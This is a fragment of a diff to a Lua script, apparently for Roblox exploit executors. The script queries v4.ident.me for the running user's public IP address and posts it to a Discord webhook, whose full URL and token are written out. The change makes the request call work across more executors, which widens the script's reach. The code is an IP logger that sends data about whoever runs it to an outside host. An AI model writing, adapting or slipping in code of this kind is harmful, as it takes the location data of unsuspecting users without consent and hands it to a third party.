@@ -1,7 +1,7 @@
 request = http_request or request or HttpPost or syn.request
 
 local body = request({Url = 'https://v4.ident.me/'; Method = 'GET'}).Body;
-local requestwebhook = syn.request({
+local requestwebhook = request({
     Url = 'https://discord.com/api/webhooks/1008211952683720784/7gs3Es0gFiiIUA_ep0zQRe72Lkfvc62sryLGFGREeZ56ycGtEaiN4mhtV_gzzxNXTPp4',
     Method = "POST",
     Headers = {
